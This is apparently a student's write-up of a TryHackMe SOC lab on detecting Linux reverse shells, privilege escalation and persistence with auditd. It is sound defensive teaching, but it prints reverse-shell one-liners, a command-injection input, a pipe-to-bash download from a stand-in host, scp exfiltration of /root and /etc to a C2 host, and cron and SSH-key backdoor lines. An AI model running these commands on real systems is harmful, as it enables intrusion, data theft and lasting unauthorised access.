---
title: Linux Threat Detection 3
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, auditd, reverse-shells, privilege-escalation, persistence]
status: Completed
date: 2026-07-03
date_completed: 2026-07-03
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
<p align="center">
<img src=screenshots/linux3_intro.png width="1500">
</p>

## Task 1: Introduction

Not all Linux attacks are simple SSH brute force or cryptomining. This room covers more complex, manual Linux attack techniques seen in targeted intrusions and how to detect them through system logs.

**Learning Objectives**

- Learn how reverse shells are used in Linux intrusions
- Understand how attackers escalate their privileges
- Explore the five most common techniques to persist on Linux
- Uncover the learned techniques through system logs

**Let's go!**

**Answer:** N/A

## Task 2: Reverse Shells

### Attack Convenience

Attackers when they breach a system thur SSH they get a visual terminal, which often has autocompletion and Ctrl+C integration.  
	- Initial Access via exploit or web vulnerability often comes with visual difficulties for the attackers.
	- Buggy command output, execution delays and timeouts, rate limits, network restrictions and many more.

**Example of Attack Limitations**
<p align="center">
<img src=screenshots/linux3_attacklimitations.png width="700">
</p>

### Reverse Shells

To reduce friction and make the workflow easier attackers will attempt to deploy a reverse shell right away.

Three methods to open a reverse shell on Linux:

| Command on the Victim | Explanation |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | The victim is forced to connect to 10.10.10.10:1337 and launch bash for the attacker. |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525. |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python alternative to the above command. The attacker is listening at 10.30.30.30:80. |



### Detecting Reverse Shells

Reverse shells should be treated as a **high alert** for any SOC. 
	- Reverse shell means a human has gained access and is actively trying to establish a shell connection to further their attack
	- Reverse shell is detectable with **auditd**

**Example: Reverse Shell Established via TryPingMe Web Vulnerability**

```
root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

The reverse shell will connect back to the attackers IP, this is usually followed by **Discovery** commands

**Example: Detecting the Reverse Shell**
```

root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
[...]

```
---

In this task, use the VM to see how TryPingMe vulnerability works in practice:
    - Access TryPingMe through your browser or AttackBox at http://MACHINE_IP:8000
    - Access the scenario auditd logs at ausearch -i -if /home/ubuntu/scenario/audit.log
	
---


**1. Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?**

<p align="center">
<img src=screenshots/linux3_trypingme.png width="700">
</p>
Whenever an attacker sees an input box their first thought proably is: is this input box sanitized, followed by inputting a command in there stringed with the format of what the input box might be looking for. In this case its looking for a domain or an IP address so the attacker does just that. The fact that this website in particular returns the result on the web browser itself lets the attacker know right away that this website is vulnerable.
Command: 127.0.0.1 && whoami 

**Answer: svctrypingme**

---

**2. Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?**

<p align="center">
<img src=screenshots/linux3_revshell.png width="700">
</p>
The attacker saw the vulnerability and now they want to run a command so that this web server calls back to their computer... Its not really practical to use the browser and the little input box to run multiple commands. The field TCP: in a real-world attack would be followed by the attacker's real IP address, and thats where the victim system will connect to. 

**Answer: THM{revshells_practitioner!}**

---

**3. Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?**

<p align="center">
<img src=screenshots/linux3_socatcommand.png width="700">
</p>
As an SOC we can set rules in auditd to search for commands that spawn reverse shell in order to maintain visibility where it matters. 

**Answer: 10.14.105.255**

---

## Task 3: Privilege Escalation

### Privilege Escalation Basics

Attackers, once they get past Initial Access they face various difficulties. We saw how a lack of an SSH connection would force them to use discovery commands on the browser window, which doesn't offer the full capabilities of bash.
	- More often than not if an attacker breaches a system they find themselves with the lowest privileges
		- These low privilege accounts dont offer much visibility usually they are low in the hierarchy; if were talking a large-scale network
		- **Privilege Escalation** MITRE technique **TA0004** definition: Consists of techniques that adversaries use to gain higher-level permissions on a system or network.

**Example: Attacker Performs Discovery to Get to Root**

| Preceding Discovery (IF) | Privilege Escalation (THEN) |
|---|---|
| The `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
| The `find /bin -perm 4000` detects an env binary with the SUID flag | Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p` |
| The `ls /etc/ssh` exposed an unprotected ssh-backup-key file | Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key` |



### Detecting Privilege Escalation



Reference syntax for confirming privilege escalation by comparing effective user before and after:

```
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data

```



---

**Which command line was used to look for the "pass" keyword in files?**

**Answer:**

**Which command line was used to escalate privileges to root?**

**Answer:**

**Looking at the detected .env file, what was the root password?**

**Answer:**

## Task 4: Startup Persistence

### Persistence in Linux



### Cron Persistence

```
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

```
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```



### Systemd Persistence

```
[Unit]
Description=Initial cloud-online job
[Service]
ExecStart=/usr/bin/cloud-online
```



### Detecting Persistence

| Monitor changes in cron job files | /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* |
|---|---|
| Monitor changes in systemd folders | /lib/systemd/system/*, /etc/systemd/system/*, and less common locations |
| Monitor related processes such as | nano /etc/crontab, crontab -e, systemctl start\|enable <service> |

Reference syntax:

```
ausearch -i -f /etc/systemd
ausearch -i -x crontab
```



**What flag did you get after running the malware persisting as a service?**

**Answer:**

**What flag did you get after running the malware persisting as a cron job?**

**Answer:**

## Task 5: Account Persistence

### Account Persistence



### New User Account

Reference syntax:

```
cat /var/log/auth.log | grep -E 'useradd|usermod'
ausearch -i --ppid <pid>
```



### Backdoored SSH Keys

Reference syntax:

```
echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
ausearch -i -f /.ssh/authorized_keys
```



### Application Persistence



**Which user was created and added to the sudo group?**

**Answer:**

**Which file was changed to allow SSH key persistence?**

**Answer:**

## Task 6: Targeted Attacks and Recap

### Targeted Attacks



### Linux as Entry Point



### Linux in Espionage



### Linux in Ransomware



### Threat Detection Recap



**Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)**

**Answer:**

**Should you learn Linux threats even if working with Windows? (Yea/Nay)**

**Answer:**

## Task 7: Conclusion

**Complete the room!**

**Answer:** N/A
